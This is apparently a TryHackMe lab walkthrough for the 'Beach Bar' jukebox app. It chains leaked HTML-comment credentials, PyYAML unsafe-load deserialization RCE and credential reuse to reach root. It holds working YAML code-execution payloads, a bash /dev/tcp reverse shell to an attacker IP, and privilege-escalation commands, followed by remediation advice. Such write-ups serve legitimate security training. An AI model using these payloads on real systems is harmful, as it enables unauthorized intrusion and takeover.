# TryHackMe — Hacker Holidays 2026
## Day 5: [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7)

**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Web / Boot2Root  
**Difficulty:** Medium

---

## Description

The Beach Bar jukebox management app is exposed on port 80. The goal is to gain initial access, exploit a deserialization vulnerability to achieve Remote Code Execution, and escalate privileges to root to capture both flags.

---

## Reconnaissance

### Port scan

```bash
nmap -sV <target_ip>
```

**Output:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Explanation:** Port 80 is open. The target is a web application.

---

## Step 1 — Discover hardcoded credentials in HTML source

Browse to `http://<target_ip>/` — the app redirects to the login page. View the page source:

```html
<!--
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj -- swap this before the season starts (ticket BAR-7)
-->
```

**Explanation:** Developers left a plaintext credential pair in an HTML comment. This is a classic information disclosure vulnerability — comments in client-side code are visible to anyone.

---

## Step 2 — Log in and explore the application

```bash
curl -c cookies.txt \
     -d "username=dj&password=dj" \
     http://<target_ip>/login \
     -L
```

**Explanation:** `-c cookies.txt` saves the session cookie. The app redirects to `/dashboard` after a successful login.

Available routes found in the nav bar:
- `/dashboard` — jukebox stats
- `/import` — upload a playlist YAML
- `/export` — download the current playlist YAML

---

## Step 3 — Export the playlist to understand the YAML format

```bash
curl -b cookies.txt http://<target_ip>/export
```

**Output:**

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist: Khruangbin
    title: Maria Tambien
  - artist: Men I Trust
    title: Show Me How
  - artist: Crumb
    title: Locket
```

**Explanation:** The app exports playlists as YAML. The import endpoint (`/import`) accepts the same format. If the server parses YAML with an unsafe loader, we can inject Python object constructors to execute arbitrary code.

---

## Step 4 — Confirm YAML deserialization (RCE proof)

PyYAML's `yaml.load()` with `Loader=yaml.Loader` (the full/unsafe loader) supports Python-specific tags like `!!python/object/apply:`. This lets us call any Python callable during parsing.

Create a test payload that runs `os.system("id")` and returns the exit code:

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist:
      !!python/object/apply:os.system
      args: ["id"]
    title: "test"
```

Paste this into the textarea at `http://<target-ip>/import` and submit. 

![import-yaml](./day5-images/import-yaml.png)

The response shows:

```text
{'playlist': {'name': 'Sunset Session', 'vibe': 'golden hour',
  'tracks': [{'artist': 0, 'title': 'test'}]}}
```

**Explanation:** `os.system()` returns the exit code, not the output. `artist: 0` means the command ran and returned 0 (success). RCE is confirmed but we need output. Use `subprocess.check_output()` instead, which returns the command's stdout as bytes.

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist:
      !!python/object/apply:subprocess.check_output
      args: ["id"]
    title: "test"
```
The response shows:
```text
{'playlist': {'name': 'Sunset Session', 'vibe': 'golden hour', 'tracks': [{'artist': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n', 'title': 'test'}]}}
```
**Explanation:** `subprocess.check_output()` captures stdout and returns it as a `bytes` object. The output appears directly in the parsed result.
---

## Step 5 — Read the user flag via YAML injection

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist:
      !!python/object/apply:subprocess.check_output
      args: [["cat", "/home/bartender/user.txt"]]
    title: "test"
```

**Output in the "Loaded playlist" card:**

```text
{'playlist': {'name': 'Sunset Session', 'vibe': 'golden hour',
  'tracks': [{'artist': b'THM{[REDACTED]}\n', 'title': 'test'}]}}
```

---

## Step 6 — Establish a reverse shell

On your Kali machine, start a listener:

```bash
nc -lvnp 4444
```

Identify your TryHackMe VPN IP:

```bash
ip addr show tun0
```

Create the reverse shell payload. Note: redirection operators (`>&`) are shell syntax and must be passed to `bash -c`, not as array arguments:

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist:
      !!python/object/apply:subprocess.check_output
      args: [["bash", "-c", "bash -i >& /dev/tcp/<attack_ip>/4444 0>&1"]]
    title: "test"
```

Submit the payload. The browser hangs — the reverse shell has connected. Your listener receives:

```text
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

The shell prompt reveals the app path: `/opt/beach-bar/`.

---

## Step 7 — Stabilise the shell

Stabilize the shell using Python's pty module:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
Ctrl + Z
```
stty raw -echo; fg
```

**Explanation:** The raw shell from `nc` has no job control and no line editing. `pty.spawn()` allocates a pseudo-terminal so the shell behaves normally (arrow keys, Ctrl+C, tab completion).

---

## Step 8 — Enumerate privilege escalation paths

With a stable shell as `bartender`, run the standard privesc checklist.

**Check sudo permissions:**

```bash
sudo -l
```

**Output:**

```text
[sudo] password for bartender:
sudo: a password is required
```

`bartender` has no passwordless sudo — dead end.

**Check SUID binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Output (excerpt):**

```text
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
...
```

Only standard system binaries — nothing exploitable.

**Check cron jobs:**

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

No custom cron jobs found.

**Check running processes:**

```bash
ps aux
```

When no obvious path is available from SUID or sudo, inspecting running processes is valuable: services started at boot by root may expose secrets in their command-line arguments, which are visible to all local users.

```bash
ps aux
```

The full output is long. From the reconnaissance phase we already know the app lives in `/opt/beach-bar/`, so we filter by that keyword:

```bash
ps aux | grep -i beach
```

**Output (relevant lines):**

```text
root  611  ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py \
              --stream-pass [REDACTED] --bitrate 320k
root  612  ... gunicorn ... --user bartender --group bartender app:app
```

## Step 9 — Privilege escalation via credential reuse

**Explanation:** `jukeboxd.py` runs as **root** and its command-line arguments are visible to all users via `ps`. The `--stream-pass` argument exposes the password `[REDACTED]` in plaintext. Developers often reuse service passwords as system account passwords.

Test the password for the root account:

```bash
su root
# Password: [REDACTED]
```

```bash
root@tryhackme-2404:/opt/beach-bar/webapp# cat /root/root.txt
THM{[REDACTED]}
```

---

## Command Option Breakdown

### `curl -c / -b cookies.txt`
- `-c cookies.txt` → save cookies from server responses to file
- `-d "key=val"` → send POST body (form data)
- `-L` → follow redirects

### `yaml.load(content, Loader=yaml.Loader)`
- `yaml.Loader` is the **full** (unsafe) loader; it processes Python-specific tags
- `yaml.safe_load()` only processes standard YAML types — no Python object constructors
- Always use `safe_load()` for untrusted input

### `!!python/object/apply:<callable>`
- PyYAML tag that calls a Python callable with the given `args` at parse time
- Effectively turns YAML parsing into arbitrary code execution

### `subprocess.check_output(args)`
- Runs a process and returns its stdout as `bytes`
- Raises `CalledProcessError` if the process exits non-zero

### `bash -c "command"`
- `-c` → execute the string as a shell command
- Required when the command contains shell operators (`>&`, `|`, `;`)

### `ps aux`
- `a` → show processes for all users
- `u` → user-oriented format (shows username, CPU, MEM, command)
- `x` → include processes not attached to a terminal

---

## Root Cause

Two independent vulnerabilities chained together:

1. **YAML Deserialization (CVE class: CWE-502):** The import endpoint uses `yaml.load()` with the full unsafe loader. Supplying a crafted YAML file with `!!python/object/apply:` tags allows an attacker to call arbitrary Python functions — including `subprocess.check_output()` — at parse time, resulting in Remote Code Execution.

2. **Credential Exposure via Process Arguments:** The `jukeboxd` service passes its password as a command-line argument (`--stream-pass`). Command-line arguments are visible to all local users via `ps`. The password was also reused for the root system account, enabling full privilege escalation.

### Remediation

| Vulnerability | Fix |
| --- | --- |
| Unsafe YAML loader | Replace `yaml.load(content, Loader=yaml.Loader)` with `yaml.safe_load(content)` |
| Secret in process args | Pass secrets via environment variables or a secrets file; never via argv |
| Credential reuse | Use unique, randomly generated passwords for each service account |
| Hardcoded demo credentials | Remove debug/demo credentials before deployment; enforce via CI checks |

---

## Result

Challenge solved by:
1. finding hardcoded credentials (`dj / dj`) in an HTML comment,
2. exploiting unsafe YAML deserialization to achieve RCE as `bartender`,
3. establishing a reverse shell and stabilising it,
4. reading the root service password exposed in process arguments,
5. reusing that password with `su root` to escalate privileges.
